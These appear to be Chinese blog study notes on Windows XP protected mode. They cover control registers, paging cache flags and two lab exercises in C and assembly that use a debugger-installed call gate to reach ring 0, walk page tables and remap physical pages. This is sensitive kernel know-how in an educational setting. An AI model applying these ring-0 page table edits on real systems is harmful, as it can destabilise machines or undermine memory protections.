<h3 id="3-1-CR0"><a href="#3-1-CR0" class="headerlink" title="3.1 CR0"></a>3.1 CR0</h3><p><img data-src="https://s2.loli.net/2022/01/09/QMc5JnSfsUotb3B.png" alt="51.png"></p>
<p>说明：</p>
<ol>
<li>PE位：为CR0的位0，是启用保护（Protection Enable）标志。<strong>这个标志仅开启段级保护，而并没有启用分页机制</strong>。<ul>
<li>PE &#x3D; 1，保护模式。</li>
<li>PE &#x3D; 0。实地址模式。</li>
</ul>
</li>
</ol>
<p>若要启用分页机制，那么PE和PG标志都要置位。</p>
<ol start="2">
<li>PG位：当设置该位时即开启了分页机制。在开启这个标志之前必须已经或者同时开启PE标志。<ul>
<li>PG &#x3D; 0 且PE &#x3D; 0 ，处理器工作在<strong>实地址模式</strong>下。</li>
<li>PG &#x3D; 0且PE &#x3D; 1，处理器工作在<strong>没有开启分页机制的保护模式下</strong>（目前没有这样的操作系统）。</li>
<li>PG &#x3D; 1且PE &#x3D; 0 ，在PE没有开启的情况下，无法开启PG。（没有这样的状态）</li>
<li>PG &#x3D; 1且PE &#x3D; 1，<strong>处理器工作在开启了分页机制的保护模式下</strong>。</li>
</ul>
</li>
<li>WP位：对于Intel 80486或以上的CPU，CR0的位16是写保护（Write Proctect）标志。当设置该标志时，处理器会<strong>禁止超级用户程序</strong>（例如特权级0的程序）<strong>向用户级只读页面执行写操作</strong>。<br>当CPL&lt;3的时候：<ul>
<li>WP &#x3D; 0，可以读写任意用户级物理页，只要线性地址有效。 </li>
<li>WP &#x3D; 1，可以读取任意用户级物理页，但对于只读的物理页，<strong>则不能写</strong>。</li>
</ul>
</li>
</ol>
<h3 id="3-2-CR2"><a href="#3-2-CR2" class="headerlink" title="3.2 CR2"></a>3.2 CR2</h3><p>当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常<br>的线性地址存放在CR2中。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/JT9DUwGHCzEKnZg.png" alt="52.png"></p>
<h3 id="3-3-CR3"><a href="#3-3-CR3" class="headerlink" title="3.3 CR3"></a>3.3 CR3</h3><p>CR3一包含了页目录的基地址和二个标志（PCD和PWT）。该寄存器也被称为页目录基地址寄存器（PDBR）。页目录基地址只有高20位确定，低12位是0，<strong>所以页目录地址必须是页边界对齐的</strong>（4K字节）。</p>
<p>对齐的（4K字节）。PCD和PWT标志控制着页目录在处理器内部数据缓冲区的缓存（它们不控制TLB页目录信息的缓存）。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/LP7hAXtRxT3Zrs8.png" alt="55.png"></p>
<h3 id="3-4-CR4"><a href="#3-4-CR4" class="headerlink" title="3.4 CR4"></a>3.4 CR4</h3><p>CR4包含了一组标志，这些标志启用了架构方面的几个扩展，并指明了系统对某些处理器支持的能力。。在保护模式下，MOV指令允许读取或者装载控制寄存器（在0级特权下）。这个限制意味着应用程序或者操作系统过程（运行在1、2、3级特权下）不能读取或者装载控制寄存器。装载控制寄存器时，保留位应该保持以前读取的值。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/sb4X6wqZujIEAQk.png" alt="53.png"></p>
<p>PAE&#x2F;PSE说明：</p>
<ul>
<li>PAE &#x3D; 1，是2-9-9-12分页。</li>
<li>PAE &#x3D; 0，是10-10-12分页。</li>
</ul>
<p>应特别注意，PDE的PS位受CR4的PSE位影响，具体如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/09/Dw7epWShPrCFKXg.png" alt="54.png"></p>
<h2 id="4-PCD和PWT标志位"><a href="#4-PCD和PWT标志位" class="headerlink" title="4 PCD和PWT标志位"></a>4 PCD和PWT标志位</h2><p>PCD和PWT标志存在于PDBR(CR3)、PDPE、PDE、PTE中，分别如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/09/LP7hAXtRxT3Zrs8.png" alt="55.png"></p>
<p>10-10-12分页PDE、PTE：</p>
<p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>2-9-9-12分页PDPE：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/l6JxzEvBt4Q9Kpa.png" alt="26.png"></p>
<p>PDE：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/ORKa3UlpH4bzMGy.png" alt="27.png"></p>
<p>PTE：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/OxFfnzJ3oUtXakI.png" alt="29.png"></p>
<p>1、CPU缓存</p>
<p>1）CPU缓存是位于CPU与物理内存之间的临时存储器，它的容量比内存小的多但是交换速度却比内存要快得多。</p>
<p>2）CPU缓存可以做的很大，有几K、几十K、几百K 甚至上M的也有。</p>
<p>CPU缓存与TLB的区别：</p>
<p>TLB：</p>
<p>​    线性地址  &lt;—–&gt;  物理地址</p>
<p>CPU缓存：</p>
<p>​    物理地址  &lt;—–&gt;  物理地址中的内容</p>
<p>2、关于PWT&#x2F;PCD属性</p>
<p>PWT：Page Write Through</p>
<ul>
<li>PWT &#x3D;  1，写Cache的时候也要将数据写入内存中。</li>
<li>PWT &#x3D;  0，写Cache时由CPU控制寄存器决定是否写入内存。</li>
</ul>
<p>PCD：Page Cache Disable</p>
<ul>
<li>PCD &#x3D; 1，禁止某个页写入缓存，直接写内存。</li>
<li>PCD &#x3D; 0，可以写入Cache。</li>
</ul>
<p>比如，做页表用的页，已经存储在TLB中了，可以不需要再缓存了。</p>
<h2 id="5-保护模式：测试1"><a href="#5-保护模式：测试1" class="headerlink" title="5 保护模式：测试1"></a>5 保护模式：测试1</h2><p>以下代码对每一个线性地址都做了检查，起始这已经包括跨页检查了。</p>
<p>跨页检查的目的：如线性地址0x0040ffd，如果要取4字节内容，则最后一个字节在下一个页，这个时候还需要对下一个页的PDE、PTE做检查。而我的代码是对每一个线性地址做检查，粒度是每一个地址，而非页，所以自然包含了跨页内存检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.给定一个线性地址，根据地址读取指定长度内容。</span></span><br><span class="line"><span class="comment">int ReadMemory(OUT BYTE* buffer,IN DWORD dwAddr,IN DWORD dwLeght)</span></span><br><span class="line"><span class="comment">要求：</span></span><br><span class="line"><span class="comment">1) 可以自己指定分页方式。</span></span><br><span class="line"><span class="comment">2) 页不存在，要提示，不能报错。</span></span><br><span class="line"><span class="comment">3) 可以正确读取数据。</span></span><br><span class="line"><span class="comment">4）要考虑跨页数据的内存检查</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">VOID <span class="title">R0GetAddrText</span><span class="params">()</span></span>;</span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> g_inti = <span class="number">0</span>;</span><br><span class="line">DWORD g_dwAddr,g_dwLen;</span><br><span class="line">BYTE g_Buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">R0ParaPDEPTE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">    	pushad;</span><br><span class="line">    	pushfd;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">//获取参数中的线性地址和要获取的内容的长度</span></span><br><span class="line">    	<span class="comment">//int 3;</span></span><br><span class="line">    	mov eax,g_dwAddr;	<span class="comment">//获取dwAddr</span></span><br><span class="line">    	mov ecx,g_dwLen;	<span class="comment">//获取dwLeght</span></span><br><span class="line">    	mov edx,eax;		<span class="comment">//edx = eax == 线性地址</span></span><br><span class="line">    	<span class="comment">//判断读取长度</span></span><br><span class="line">    	cmp ecx,<span class="number">0x0</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x0</span>;		<span class="comment">//dwRet = dwLeght == 0，返回0，读取失败</span></span><br><span class="line">    	je __GoRet;</span><br><span class="line">    	<span class="comment">//jmp __GetPDE;		//不用jmp，会自动执行下面地址</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//先找PDE</span></span><br><span class="line">__GetPDE:</span><br><span class="line">    	shr eax,<span class="number">18</span>;		<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    	add eax,<span class="number">0xc0600000</span>;	<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">				<span class="comment">//eax 指向PDE</span></span><br><span class="line">    	mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    	mov esi,eax;		<span class="comment">//esi = eax == PDE低4字节</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//判断PDE_P位</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x1</span>;		<span class="comment">//eax == PDE_P</span></span><br><span class="line">    	test eax,<span class="number">0x1</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x1</span>;		<span class="comment">//dwRet == 1		</span></span><br><span class="line">    	je __GoRet;		<span class="comment">//PDE_P == 0，返回1，读取失败</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//判断PDE_PS位</span></span><br><span class="line">    	<span class="keyword">and</span> esi,<span class="number">0x80</span>;</span><br><span class="line">    	cmp esi,<span class="number">0x0</span>;</span><br><span class="line">    	je __GetPTE;		<span class="comment">//PDE_PS == 0，小页</span></span><br><span class="line">    	mov dwRet,<span class="number">0x1</span>;</span><br><span class="line">    	jmp __GoRet;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">//再找PTE</span></span><br><span class="line">__GetPTE:</span><br><span class="line">    	mov eax,edx;</span><br><span class="line">    	shr eax,<span class="number">9</span>;		<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;	<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    	add eax,<span class="number">0xc0000000</span>;	<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">	    			<span class="comment">//eax指向PTE</span></span><br><span class="line">    	mov eax,[eax];		<span class="comment">//eax = PTE低4字节</span></span><br><span class="line">    	mov edi,eax;		<span class="comment">//esi = eax == PTE</span></span><br><span class="line">    	<span class="comment">//判断PTE_P位</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x1</span>;		<span class="comment">//eax = PTE_P</span></span><br><span class="line">    	test eax,<span class="number">0x1</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x2</span>;</span><br><span class="line">    	je __GoRet;		<span class="comment">//PTE_P == 0，dwRet = 2，返回2，读取失败</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//判断PTE_PAT</span></span><br><span class="line">    	<span class="keyword">and</span> edi,<span class="number">0x80</span>;</span><br><span class="line">    	test edi,<span class="number">0x1</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x3</span>;</span><br><span class="line">    	jne __GoRet;		<span class="comment">//PTE_PAT == 1，这种情况目前还不清楚，先不处理</span></span><br><span class="line">    	mov dwRet,<span class="number">0x4</span>;</span><br><span class="line"></span><br><span class="line">__GoRet:</span><br><span class="line">    	popfd</span><br><span class="line">        popad</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID __declspec(naked) R0GetAddrText()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span>(g_dwLen)</span><br><span class="line">	&#123;</span><br><span class="line">		R0ParaPDEPTE();</span><br><span class="line">    <span class="keyword">switch</span>(dwRet)</span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">3</span>: __asm retf;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memcpy</span>((PBYTE)((DWORD)g_Buffer+g_inti),(PBYTE)g_dwAddr,<span class="number">0x1</span>);</span><br><span class="line">		<span class="comment">//g_Buffer[g_inti] = ((PBYTE)g_dwAddr)[g_inti];</span></span><br><span class="line">		g_inti++;</span><br><span class="line">		g_dwAddr++;</span><br><span class="line">		g_dwLen--;</span><br><span class="line">	&#125;</span><br><span class="line">	__asm retf;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ReadMemory</span><span class="params">(OUT BYTE* buffer,IN DWORD dwAddr,IN DWORD dwLeght)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.若线性地址在低2G，则0~4KB与0x7FFFFFFF-4KB~0x7FFFFFFF为保留地址，不可读</span></span><br><span class="line">	<span class="comment">//实际判断PDE、PTE就可以，无须根据线性地址判断（线性地址的读写实际都是根据此判断的）</span></span><br><span class="line">	<span class="comment">//实际流程和函数MmIsAddressValid差不多</span></span><br><span class="line">	<span class="comment">//g_Buffer = buffer;</span></span><br><span class="line">	g_dwAddr = dwAddr;</span><br><span class="line">	g_dwLen = dwLeght;</span><br><span class="line"></span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0GetAddrText&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0GetAddrText &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">	  	call fword ptr ds:[CallGate]</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">switch</span>(dwRet)</span><br><span class="line">	 &#123;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;要读取内容的长度为0，请检查！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;要读取内容的PDE无效，请检查！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;访问空地址或当前内存读取错误(PTE),请检查！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;要读取内容的PTE_PAT = 1，目前该程序还不支持！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;读取成功！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;有毒！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2-9-9-12分页</span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	DWORD bTestNum = <span class="number">0x666</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;测试地址%x\n&quot;</span>,&amp;bTestNum);</span><br><span class="line">	DWORD dwAddr,dwLen;</span><br><span class="line">	BYTE bBuffer[<span class="number">0x1000</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;函数功能：读取指定地址处的指定长度的内容！(0-4096字节)\n请输入指定地址(十六进制)：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>,&amp;dwAddr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入要读取字节长度：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;dwLen);</span><br><span class="line">  </span><br><span class="line">	ReadMemory(bBuffer,dwAddr,dwLen);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;读取内容：&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(dwRet == <span class="number">0x4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;读取内容：&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(;dwLen &gt; <span class="number">0</span>;)</span><br><span class="line">		&#123;</span><br><span class="line">			dwLen--;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,g_Buffer[dwLen]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/10/hxZFjLwd14ypgWY.png" alt="56.png"></p>
<h2 id="6-保护模式：测试2"><a href="#6-保护模式：测试2" class="headerlink" title="6 保护模式：测试2"></a>6 保护模式：测试2</h2><p>题目：</p>
<p>申请长度为100的DWORD的数组，且每项的值用该项的地址初始化；<br>把这个数组所在的物理页挂到0x1000的地址上；<br>定义一个指针，指向0x1000这个页里的数组所在的地址,用0x1000这个页的线性地址打印出这数组的值。</p>
<p>要求：<br>数组所在的物理页，是同一个页。</p>
<p>本题在：2-9-9-12分页模式下，页大小：4KB，PTE_PAT &#x3D; 0条件下解题。</p>
<ol>
<li>先获取数组pArr的PDE、PTE。</li>
<li>检查线性地址0x1000的PDE_P：（若PDE存在且PS &#x3D; 1，仅需要替换PTE即可）<ul>
<li>PDE_P &#x3D; 1，判断PDE_PS：<ul>
<li>PDE_PS &#x3D; 0，则直接用pArr的PTE替换即可。</li>
<li>PDE_PS &#x3D; 1，替换PDE和PTE。</li>
</ul>
</li>
</ul>
</li>
<li>修改PTE就要清空TLB。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PDWORD pArr = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwArr = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">VOID __declspec(naked) CallGate_RW8003f048()</span><br><span class="line">&#123;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    pushfd;</span><br><span class="line">    <span class="comment">//先找pArr的PDE</span></span><br><span class="line">    <span class="comment">//int 3;</span></span><br><span class="line">    mov eax,dwArr;</span><br><span class="line">    push eax;</span><br><span class="line">    shr eax,<span class="number">18</span>;			<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0600000</span>;		<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    				<span class="comment">//eax 指向PDE</span></span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    mov ebx,eax;		<span class="comment">//ebx = eax = PDE低4字节</span></span><br><span class="line">    <span class="comment">//再找pArr的PTE</span></span><br><span class="line">    pop eax;</span><br><span class="line">    shr eax,<span class="number">9</span>;			<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;		<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0000000</span>;		<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    				<span class="comment">//eax指向PTE</span></span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PTE低4字节</span></span><br><span class="line">    mov ecx,eax;		<span class="comment">//ecx = eax = PTE低4字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//找0x1000的PDE;</span></span><br><span class="line">    mov eax,<span class="number">0x1000</span>;</span><br><span class="line">    mov esi,eax;</span><br><span class="line">    shr eax,<span class="number">18</span>;			<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0600000</span>;		<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    </span><br><span class="line">    mov edx,eax;		<span class="comment">//edx = eax指向0x1000的PDE</span></span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    mov edi,eax;		<span class="comment">//edi = eax = 0x1000的PDE低4字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断0x1000_PDE_P位</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x1</span>;		<span class="comment">//eax == PDE_P</span></span><br><span class="line">    test eax,<span class="number">0x1</span>;</span><br><span class="line">    je __FixPDE;		<span class="comment">//PDE_P == 0，修改PDE</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断0x1000_PDE_PS位</span></span><br><span class="line">    <span class="keyword">and</span> edi,<span class="number">0x80</span>;</span><br><span class="line">    test edi,<span class="number">0x1</span>;</span><br><span class="line">    jne __FixPDE;		<span class="comment">//0x1000_PDE_PS == 1，大页</span></span><br><span class="line">   </span><br><span class="line">__FIXPTE:</span><br><span class="line">    mov eax,esi;</span><br><span class="line">    shr eax,<span class="number">9</span>;			<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;		<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0000000</span>;		<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    				<span class="comment">//eax指向PTE</span></span><br><span class="line">    mov [eax],ecx;		<span class="comment">//0x1000_PTE = pAddr_PTE</span></span><br><span class="line">    INVLPG dword ptr ds:[<span class="number">0x1000</span>];<span class="comment">//清空0x1000的TLB</span></span><br><span class="line"></span><br><span class="line">__GoRet:</span><br><span class="line">    popfd;</span><br><span class="line">    popad;</span><br><span class="line">    retf;</span><br><span class="line">    </span><br><span class="line">__FixPDE:</span><br><span class="line">    mov [edx],ebx;		<span class="comment">//0x1000_PDE = pAddr_PDE</span></span><br><span class="line">    jmp __FIXPTE;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  DWORD i = <span class="number">0</span>;</span><br><span class="line">  BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">  pArr = (PDWORD)VirtualAlloc(<span class="number">0</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">  dwArr = (DWORD)pArr;</span><br><span class="line">  <span class="keyword">while</span>(i &lt; <span class="number">100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    pArr[i] =  (DWORD)&amp;pArr[i];</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)CallGate_RW8003f048&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)CallGate_RW8003f048 &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">  system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">  __asm</span><br><span class="line">  	&#123;</span><br><span class="line">    	call fword ptr ds:[CallGate];</span><br><span class="line">  	&#125;</span><br><span class="line">	</span><br><span class="line">  PDWORD p = (PDWORD)<span class="number">0x1000</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(i &lt; <span class="number">100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;元素 %d 的值为：%x\n&quot;</span>,i+<span class="number">1</span>,p[i]);</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img data-src="https://s2.loli.net/2022/01/11/fQZOMGjc3rpvHKw.png" alt="57.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 段保护（三）</title>
    <url>/post/WinXP-ProtectionMode-Segment3/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-中断门"><a href="#1-中断门" class="headerlink" title="1 中断门"></a>1 中断门</h2><div class="note success"><p>回顾：</p>
<p><strong>保护模式保护的是内存、特权指令（保护寄存器）</strong>。</p>
<ol>
<li>调用门3环堆栈切换到0环堆栈：ESP0、SS0来自TSS，而TSS由Windows的线程提供。</li>
<li>实际上3环进0环<strong>是在一个线程上执行的</strong>，该线程从3环进到0环，维护两个堆栈（一个是3环的，一个是0环的），线程从0环返回时并不会破环0环的堆栈，下次该线程再进0环时将从ESP0处继续使用堆栈。</li>
<li>一个核只有一个TSS（内存块），该CPU共享。但是不同的线程一般TSS值不同（TSS可修改，线程切换时将值填到TSS中）。</li>
</ol>
</div>

<p><strong>Windows没有使用调用门</strong>，但是使用了中断门：</p>
<ol>
<li>系统调用（老的CPU，从3环到0环。新的CPU直接通过快速调用）</li>
<li>调试（int 3）</li>
</ol>
<p>执行调用门的指令：<code>CALL CS:EIP</code>，CS是段选择子，包含了查找<mark class="label info">GDT</mark>表的是一个索引。<br>但当CPU执行如下指令：<mark class="label danger">INT N</mark>，查询的却是另外一张表，这张表叫<mark class="label info">IDT</mark>。</p>
<p>IDT即中断描述符表，同GDT一样，IDT也是由一系列描述符组成的，每个描述符占8个字节。但要注意的是，IDT表中的第一个元素不是NULL。</p>
<p>IDT 表包含三种门描述符（具体参看Intel开发手册卷3的6.10 IDT）：</p>
<ol>
<li>中断门描述符</li>
<li>任务门描述符</li>
<li>陷阱门描述符</li>
</ol>
<p>使用windbg查看IDT表的基地址和长度：</p>
